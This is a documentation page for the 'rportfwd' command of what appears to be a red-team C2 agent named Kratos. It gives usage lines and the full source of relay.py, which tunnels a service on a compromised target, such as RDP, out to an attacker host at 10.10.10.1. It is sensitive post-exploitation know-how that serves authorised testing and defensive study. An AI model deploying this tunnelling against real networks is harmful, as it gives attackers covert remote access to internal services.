+++
title = "rportfwd"
chapter = false
weight = 5
+++

## Summary
Reverse port forward: the agent connects a local service on the target back to the attacker machine, which runs `relay.py` to bridge the connection to a local client port.

## Arguments
| Name | Required | Description |
|------|----------|-------------|
| `action` | Yes | `start` or `stop` |
| `local_host` | No | Host on the target (default: 127.0.0.1) |
| `local_port` | Yes | Port of the service to forward (e.g. 3389) |
| `remote_host` | No | Attacker IP where relay.py listens |
| `remote_port` | No | Attacker port for the agent connection |

## Usage

**Attacker side:**
```
python3 relay.py 4444 13389
```

**Mythic:**
```
rportfwd -Action start -LocalPort 3389 -RemoteHost 10.10.10.1 -RemotePort 4444
```

**Connect:**
```
xfreerdp /v:127.0.0.1:13389 /u:DOMAIN\user ...
```

**Stop:**
```
rportfwd -Action stop -LocalPort 3389
```

## Flow
```
target:3389 <-> agent <-> attacker:4444 <-> relay.py <-> client:13389
```

## relay.py

`relay.py` bridges the two TCP connections: one from the Kratos agent, one from the local client tool. It is included in the Kratos repository root.

```python
#!/usr/bin/env python3
"""
relay.py - Kratos rportfwd relay server
Usage: python3 relay.py <agent_port> <client_port>
"""
import socket
import sys
import threading


def relay(a: socket.socket, b: socket.socket) -> None:
    def fwd(src: socket.socket, dst: socket.socket) -> None:
        try:
            while chunk := src.recv(65536):
                dst.sendall(chunk)
        except OSError:
            pass
        finally:
            try:
                dst.shutdown(socket.SHUT_WR)
            except OSError:
                pass

    t = threading.Thread(target=fwd, args=(a, b), daemon=True)
    t.start()
    fwd(b, a)
    t.join()
    a.close()
    b.close()


def listen_one(port: int, label: str) -> socket.socket:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    print(f"[*] Waiting for {label} on :{port} ...")
    conn, addr = srv.accept()
    srv.close()
    print(f"[+] {label} connected from {addr[0]}:{addr[1]}")
    return conn


def main() -> None:
    if len(sys.argv) != 3:
        print(__doc__)
        sys.exit(1)

    agent_port  = int(sys.argv[1])
    client_port = int(sys.argv[2])

    results: list[socket.socket | None] = [None, None]
    errors:  list[Exception | None]     = [None, None]

    def get(port: int, label: str, idx: int) -> None:
        try:
            results[idx] = listen_one(port, label)
        except Exception as e:
            errors[idx] = e

    t0 = threading.Thread(target=get, args=(agent_port,  "Kratos agent", 0), daemon=True)
    t1 = threading.Thread(target=get, args=(client_port, "local client",  1), daemon=True)
    t0.start()
    t1.start()
    t0.join()
    t1.join()

    for err in errors:
        if err:
            print(f"[!] Error: {err}")
            sys.exit(1)

    print("[*] Both connected. Relaying ...")
    relay(results[0], results[1])
    print("[-] Session closed. Waiting for next connection ...\n")
    main()


if __name__ == "__main__":
    main()
```

## Notes
- `relay.py` accepts connections in any order (agent and client connect in parallel).
- Automatically loops and waits for the next session after the current one closes.
- Requires Python 3.8+ (walrus operator).
